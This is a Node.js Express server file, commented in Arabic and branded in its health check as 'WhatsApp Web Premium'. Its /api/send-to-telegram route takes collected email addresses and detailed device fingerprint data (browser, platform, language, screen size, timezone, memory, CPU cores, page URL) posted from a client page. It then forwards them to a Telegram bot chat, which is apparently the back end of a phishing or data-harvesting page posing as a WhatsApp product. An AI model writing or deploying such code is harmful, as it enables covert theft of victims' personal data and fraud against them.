const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API لإرسال البيانات للتلجرام
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message, data } = req.body;
        
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.status(400).json({ 
                success: false, 
                error: 'إعدادات التلجرام غير موجودة' 
            });
        }

        const telegramMessage = `
${message}

📧 **الإيميلات المجمعة (${data.emails.length}):**
${data.emails.map(email => `• ${email}`).join('\n')}

📱 **معلومات الجهاز:**
• المتصفح: ${data.deviceInfo.userAgent.split(' ')[0]}
• النظام: ${data.deviceInfo.platform}
• اللغة: ${data.deviceInfo.language}
• الشاشة: ${data.deviceInfo.screen.width}x${data.deviceInfo.screen.height}

🌍 **المزيد من المعلومات:**
• المنطقة: ${data.deviceInfo.timezone}
• الذاكرة: ${data.deviceInfo.hardware.deviceMemory}GB
• المعالج: ${data.deviceInfo.hardware.concurrency} نواة

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🔗 **الرابط:** ${data.metadata.pageUrl}
        `.trim();

        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        });

        const result = await telegramResponse.json();
        
        res.json({
            success: true,
            message: 'تم إرسال البيانات إلى التلجرام بنجاح',
            telegramResponse: result
        });

    } catch (error) {
        console.error('❌ خطأ في الإرسال:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: '✅ يعمل', 
        timestamp: new Date().toISOString(),
        service: 'WhatsApp Web Premium'
    });
});

app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على البورت ${PORT}`);
    console.log(`📧 بوت التلجرام: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ غير مضبوط'}`);
});
